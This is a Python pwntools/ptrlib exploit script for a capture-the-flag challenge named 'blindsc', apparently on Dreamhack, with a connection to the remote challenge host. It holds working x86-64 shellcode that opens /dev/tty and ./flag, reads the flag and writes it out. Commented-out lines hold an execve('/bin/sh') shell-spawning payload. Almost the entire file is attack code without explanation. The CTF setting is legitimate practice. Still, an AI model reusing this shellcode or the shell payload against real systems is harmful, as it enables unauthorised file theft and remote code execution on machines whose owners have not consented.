#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn
import time

exe = ptr.ELF("./blindsc")
pwn.context.binary = pwn.ELF(exe.filepath)
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 22890)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def asm(code: list[str]) -> bytes:
    shellcode = ""
    for i in code:
        shellcode += f"{i};"
    return pwn.asm(shellcode)


def main():
    io = connect()

    shellcode = [
        # execve
        # "mov rdi, 1",
        # "mov rsi, 3",
        # "mov rax, 33",
        # "syscall",
        # "nop",
        # "mov rax, 0x68732f6e69622f",
        # "mov [rsp], rax",
        # "mov rdi, rsp",
        # "mov rsi, 0",
        # "mov rdx, 0",
        # "mov rax, 59",
        # "syscall",
        # "nop",
        # # open('/dev/tty')
        "mov rax, 0x7974742f7665642f",
        "mov [rsp], rax",
        "mov rdi, rsp",
        "mov rsi, 2",
        "mov rax, 2",
        "syscall",
        # open('/proc/self/fd/1')
        # f"mov rax, {hex(ptr.u64(b'/proc/se'))}",
        # "mov [rsp], rax",
        # f"mov rax, {hex(ptr.u64(b'lf/fd/1'))}",
        # f"add rsp, 8",
        # "mov [rsp], rax",
        # "sub rsp, 8",
        # "mov rdi, rsp",
        # "mov rsi, 2",
        # "mov rdx, 2",
        # "mov rax, 2",
        # "syscall",
        # open("./flag")
        "mov rax, 0x67616c662f2e",
        "mov [rsp], rax",
        "mov rdi, rsp",
        "mov rsi, 0",
        "mov rdx, 0",
        "mov rax, 2",
        "syscall",
        # read()
        "mov rdi, rax",
        "mov rsi, rsp",
        "mov rdx, 0x100",
        "mov rax, 0",
        "syscall",
        # write()
        "mov rdi, 4",
        "mov rax, 1",
        "syscall",
    ]

    payload = asm(shellcode)
    input(">> ")
    io.sendline(payload)
    input(">>")
    # time.sleep()
    # io.recvuntil(b"DH")
    io.interactive()
    return


if __name__ == "__main__":
    main()
